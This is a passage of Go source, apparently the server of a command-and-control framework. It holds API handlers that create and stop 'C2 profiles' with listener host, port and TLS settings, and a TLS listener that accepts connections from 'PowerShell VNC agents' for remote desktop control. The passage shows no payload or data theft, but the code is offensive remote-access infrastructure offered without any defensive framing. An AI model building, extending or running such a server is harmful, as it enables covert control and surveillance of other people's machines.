
		// Parse the incoming profile data
		var profileData map[string]interface{}
		if err := json.NewDecoder(r.Body).Decode(&profileData); err != nil {
			log.Printf("Failed to parse profile stop data: %v", err)
			http.Error(w, "Invalid profile data", http.StatusBadRequest)
			return
		}

		profileID := getStringFromMap(profileData, "id", "")
		if profileID == "" {
			http.Error(w, "Profile ID is required", http.StatusBadRequest)
			return
		}

		log.Printf("Stopping profile: %s", profileID)

		// UPDATE THE STORED PROFILE STATUS
		profilesMutex.Lock()
		if storedProfile, exists := profilesStorage[profileID]; exists {
			storedProfile["isActive"] = false
			storedProfile["stoppedAt"] = time.Now().Format(time.RFC3339)
			storedProfile["status"] = "stopped"
			profilesStorage[profileID] = storedProfile
		}
		profilesMutex.Unlock()

		// Return success with profile status
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"message":   "Profile stopped successfully",
			"profileId": profileID,
			"status":    "inactive",
			"stoppedAt": time.Now().Format(time.RFC3339),
		})
	}).Methods("POST", "OPTIONS")

	api.HandleFunc("/profile/create", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("PROFILE CREATE CALLED")

		// Parse the incoming profile data
		var profileData map[string]interface{}
		if err := json.NewDecoder(r.Body).Decode(&profileData); err != nil {
			log.Printf("Failed to parse profile data: %v", err)
			http.Error(w, "Invalid profile data", http.StatusBadRequest)
			return
		}

		// Generate a unique ID for the profile
		profileID := fmt.Sprintf("profile_%d", time.Now().Unix())

		// Create the profile response with the actual data - PROPER GO SYNTAX
		createdProfile := map[string]interface{}{
			"id":          profileID,
			"name":        getStringFromMap(profileData, "name", "Default Profile"),
			"projectName": getStringFromMap(profileData, "projectName", "Default Project"),
			"host":        getStringFromMap(profileData, "host", "0.0.0.0"),
			"port":        getIntFromMap(profileData, "port", 23456),
			"description": getStringFromMap(profileData, "description", "Default C2 profile"),
			"useTLS":      getBoolFromMap(profileData, "useTLS", true),
			"certFile":    getStringFromMap(profileData, "certFile", ""),
			"keyFile":     getStringFromMap(profileData, "keyFile", ""),
			"isActive":    false,
			"createdAt":   time.Now().Format(time.RFC3339),
			"connections": 0,
		}

		// ACTUALLY STORE THE PROFILE
		profilesMutex.Lock()
		profilesStorage[profileID] = createdProfile
		profilesMutex.Unlock()

		log.Printf("Profile created and STORED with ID: %s", profileID)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(createdProfile)
	}).Methods("POST", "OPTIONS")

	// START VNC TLS LISTENER ON SEPARATE PORT
	go func() {
		vncPort := config.Server.APIPort + 1000 // VNC port is API port + 1000

		log.Printf("🚀 STARTING VNC TLS LISTENER ON PORT %d", vncPort)

		// Create TLS config for VNC
		tlsConfig := &tls.Config{
			MinVersion: tls.VersionTLS12,
			MaxVersion: tls.VersionTLS13,
		}

		// Load TLS certificates if available
		if certFile, keyFile := "../server.crt", "../server.key"; fileExists(certFile) && fileExists(keyFile) {
			cert, err := tls.LoadX509KeyPair(certFile, keyFile)
			if err == nil {
				tlsConfig.Certificates = []tls.Certificate{cert}
				log.Printf("✅ Loaded VNC TLS certificates from %s and %s", certFile, keyFile)
			} else {
				log.Printf("❌ Failed to load VNC TLS certificates: %v", err)
			}
		} else {
			log.Printf("⚠️ VNC TLS certificates not found, using default config")
		}

		// Create VNC listener
		listener, err := tls.Listen("tcp", fmt.Sprintf(":%d", vncPort), tlsConfig)
		if err != nil {
			log.Printf("❌ FAILED TO START VNC TLS LISTENER: %v", err)
			return
		}
		defer listener.Close()

		log.Printf("🎯 VNC TLS LISTENER STARTED SUCCESSFULLY ON PORT %d", vncPort)
		log.Printf("🎯 PowerShell VNC agents should connect to localhost:%d", vncPort)

		// Accept VNC connections
		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Printf("❌ VNC connection accept error: %v", err)
				continue
			}

			// Handle VNC connection in goroutine
			go func(conn net.Conn) {
				defer conn.Close()

				agentIP := conn.RemoteAddr().String()
				if host, _, err := net.SplitHostPort(agentIP); err == nil {
					agentIP = host
				}

				log.Printf("🎯 VNC AGENT CONNECTED FROM %s", agentIP)

				// Get VNC service and handle connection
				vncService := listenerService.GetVNCService()
				if vncService != nil {
					vncService.HandleVNCConnection(conn, agentIP)
					log.Printf("✅ VNC connection handled by service")
				} else {
					log.Printf("❌ VNC service not available")
				}
			}(conn)
		}
	}()

	// Start HTTP server
	server := &http.Server{
		Addr:    fmt.Sprintf(":%d", config.Server.APIPort),
		Handler: router,
	}

	log.Printf("Starting HTTP server on port %d", config.Server.APIPort)
	log.Printf("Server will be accessible at:")
	log.Printf("  - http://localhost:%d", config.Server.APIPort)
	log.Printf("  - http://192.168.0.111:%d", config.Server.APIPort)
	log.Printf("VNC TLS listener will be on port %d", config.Server.APIPort+1000)
	log.Printf("Registered routes:")
	log.Printf("  - / (root)")
	log.Printf("  - /test-main")
	log.Printf("  - /api/health")
	log.Printf("  - /api/simple-test")
	log.Printf("  - /api/profile/list")
	log.Printf("  - /api/profile/create")

	go func() {
		log.Printf("HTTP server starting on :%d...", config.Server.APIPort)
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("HTTP server error: %v", err)
		}
	}()

	// Test server startup
	log.Printf("Waiting for server to start up...")
	for attempt := 1; attempt <= 10; attempt++ {
		time.Sleep(1 * time.Second)
		if resp, err := http.Get(fmt.Sprintf("http://localhost:%d/api/health", config.Server.APIPort)); err == nil {
			resp.Body.Close()
			log.Printf("HTTP server is ready and responding (attempt %d)", attempt)
			break
		}
	}

	// Wait for interrupt signal
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	log.Printf("Server is running. Press Ctrl+C to stop.")
	<-sigChan

	log.Printf("Shutting down server...")
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	if err := server.Shutdown(ctx); err != nil {
		log.Printf("Server shutdown error: %v", err)
	}

	log.Printf("Server stopped successfully")
}
